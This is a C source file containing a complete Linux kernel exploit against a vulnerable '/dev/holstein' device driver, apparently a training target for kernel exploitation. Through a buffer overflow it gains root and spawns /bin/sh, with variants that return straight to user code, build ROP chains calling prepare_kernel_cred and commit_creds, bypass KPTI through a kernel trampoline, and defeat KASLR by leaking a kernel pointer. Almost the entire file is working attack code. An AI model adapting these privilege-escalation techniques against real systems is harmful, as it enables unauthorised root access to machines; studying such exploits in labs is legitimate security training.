#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#define BUFFER_SIZE 0x500

void err(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}
void info(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stdout, "%s", "[+] ");
    va_list args;
    va_start(args, format);
    vfprintf(stdout, format, args);
    va_end(args);
    fprintf(stdout, "%s", "\n");
}

struct save_state
{
    uint64_t cs;
    uint64_t ss;
    uint64_t rsp;
    uint64_t rflags;
};

void save_state(struct save_state *state)
{
    info("Saving state");
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(state->cs), "=r"(state->ss), "=r"(state->rsp), "=r"(state->rflags)
        :
        : "memory");
}

static void win()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    info("You win!");
    execve("/bin/sh", argv, envp);
}

void restore_state(struct save_state *state, void (*f)())
{
    asm volatile("swapgs ;"
                 "movq %0, 0x20(%%rsp)\t\n"
                 "movq %1, 0x18(%%rsp)\t\n"
                 "movq %2, 0x10(%%rsp)\t\n"
                 "movq %3, 0x08(%%rsp)\t\n"
                 "movq %4, 0x00(%%rsp)\t\n"
                 "iretq"
                 :
                 : "r"(state->ss),
                   "r"(state->rsp),
                   "r"(state->rflags),
                   "r"(state->cs), "r"(f));
}

static struct save_state state;
static void escalate_privilege()
{
    const uint64_t prepare_kernel_cred = 0xffffffff8106e240;
    const uint64_t commit_creds = 0xffffffff8106e390;
    char *(*pkc)(int) = (void *)(prepare_kernel_cred);
    void (*cc)(char *) = (void *)(commit_creds);

    (*cc)((*pkc)(0));
    restore_state(&state, win);
}

// run exploit without smep. Can just call userspace code from kernel
void exp_no_smep(char *buf)
{
    *(unsigned long *)&buf[0x408] = (unsigned long)&escalate_privilege;
}

void exp_krop(char *buf)
{
    const uint64_t prepare_kernel_cred = 0xffffffff8106e240;
    const uint64_t commit_creds = 0xffffffff8106e390;
    const uint64_t pop_rdi = 0xffffffff8127bbdc;
    const uint64_t mov_rdi_rax = 0xffffffff8160c96b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    const uint64_t pop_rcx = 0xffffffff812ac83f;     // pop rcx; xor al, 0; ret;
    const uint64_t swapgs = 0xffffffff8160bfac;
    const uint64_t iretq = 0xffffffff810202af;

    uint64_t *chain = (uint64_t *)&buf[0x408];
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    // store rax to rdi. so that you can call commit creds
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax;
    *chain++ = commit_creds;

    // Change kernel segment to userspace segment for smep
    *chain++ = swapgs;

    // iretq to userspace. need to have correct state in stack
    *chain++ = iretq;
    *chain++ = (uint64_t)win;
    *chain++ = state.cs;
    *chain++ = state.rflags;
    *chain++ = state.rsp;
    *chain++ = state.ss;
}

void exp_kpti(char *buf)
{
    const uint64_t prepare_kernel_cred = 0xffffffff8106e240;
    const uint64_t commit_creds = 0xffffffff8106e390;
    const uint64_t pop_rdi = 0xffffffff8127bbdc;
    const uint64_t mov_rdi_rax = 0xffffffff8160c96b; // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    const uint64_t pop_rcx = 0xffffffff812ac83f;     // pop rcx; xor al, 0; ret;
    const uint64_t swapgs = 0xffffffff8160bfac;
    const uint64_t iretq = 0xffffffff810202af;

    //    0xffffffff81800e26:  mov    rdi,rsp
    //    0xffffffff81800e29:  mov    rsp,QWORD PTR gs:0x6004
    //    0xffffffff81800e32:  push   QWORD PTR [rdi+0x30]
    //    0xffffffff81800e35:  push   QWORD PTR [rdi+0x28]
    //    0xffffffff81800e38:  push   QWORD PTR [rdi+0x20]
    //    0xffffffff81800e3b:  push   QWORD PTR [rdi+0x18]
    //    0xffffffff81800e3e:  push   QWORD PTR [rdi+0x10]
    //    0xffffffff81800e41:  push   QWORD PTR [rdi]
    //    0xffffffff81800e43:  push   rax
    //    0xffffffff81800e44:  xchg   ax,ax
    //    0xffffffff81800e46:  mov    rdi,cr3
    const uint64_t kpti_bypass = 0xffffffff81800e26;

    uint64_t *chain = (uint64_t *)&buf[0x408];
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    // store rax to rdi. so that you can call commit creds
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax;
    *chain++ = commit_creds;
    // call kpti bypass . this will change kernel stack to userspace stack
    *chain++ = kpti_bypass;
    *chain++ = 0xdeadbeefcafebabe; // [rsp]
    *chain++ = 0xdeadbeefcafebabe; // [rsp+8]
    *chain++ = (uint64_t)win;
    *chain++ = state.cs;
    *chain++ = state.rflags;
    *chain++ = state.rsp;
    *chain++ = state.ss;
}
static uint64_t kbase;
#define kaslr(addr) (kbase + addr)

void exp_kaslr(int fd, char *buf)
{
    kbase = 0x0;
    /* Leak kernel base */
    char leak[0x1000] = {0};
    memset(leak, 'B', 0x480);
    read(fd, leak, 0x410);
    unsigned long addr_vfs_read = *(unsigned long *)&leak[0x408];
    kbase = addr_vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);
    info("kbase = 0x%016lx\n", kbase);
    const uint64_t prepare_kernel_cred = kaslr(0x06e240);
    const uint64_t commit_creds = kaslr(0x06e390);
    const uint64_t pop_rdi = kaslr(0x27bbdc);
    const uint64_t mov_rdi_rax = kaslr(0x60c96b); // mov rdi, rax; rep movsq [rdi], [rsi]; ret;
    const uint64_t pop_rcx = kaslr(0x2ac83f);     // pop rcx; xor al, 0; ret;
    const uint64_t swapgs = kaslr(0x60bfac);
    const uint64_t iretq = kaslr(0x0202af);

    //    0xffffffff81800e26:  mov    rdi,rsp
    //    0xffffffff81800e29:  mov    rsp,QWORD PTR gs:0x6004
    //    0xffffffff81800e32:  push   QWORD PTR [rdi+0x30]
    //    0xffffffff81800e35:  push   QWORD PTR [rdi+0x28]
    //    0xffffffff81800e38:  push   QWORD PTR [rdi+0x20]
    //    0xffffffff81800e3b:  push   QWORD PTR [rdi+0x18]
    //    0xffffffff81800e3e:  push   QWORD PTR [rdi+0x10]
    //    0xffffffff81800e41:  push   QWORD PTR [rdi]
    //    0xffffffff81800e43:  push   rax
    //    0xffffffff81800e44:  xchg   ax,ax
    //    0xffffffff81800e46:  mov    rdi,cr3
    const uint64_t kpti_bypass = kaslr(0x800e26);

    uint64_t *chain = (uint64_t *)&buf[0x408];
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    // store rax to rdi. so that you can call commit creds
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax;
    *chain++ = commit_creds;
    // call kpti bypass . this will change kernel stack to userspace stack
    *chain++ = kpti_bypass;
    *chain++ = 0xdeadbeefcafebabe; // [rsp]
    *chain++ = 0xdeadbeefcafebabe; // [rsp+8]
    *chain++ = (uint64_t)win;
    *chain++ = state.cs;
    *chain++ = state.rflags;
    *chain++ = state.rsp;
    *chain++ = state.ss;
}

int main()
{
    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0)
    {
        err("Failed to open device");
    }
    save_state(&state);

    char buf[BUFFER_SIZE] = {0};
    memset(buf, 0, BUFFER_SIZE);

    // exp_no_smep(buf);
    // exp_krop(buf);
    // exp_kpti(buf);
    exp_kaslr(fd, buf);

    info("Writing to device");

    write(fd, buf, BUFFER_SIZE);

    close(fd);
    return 0;
}
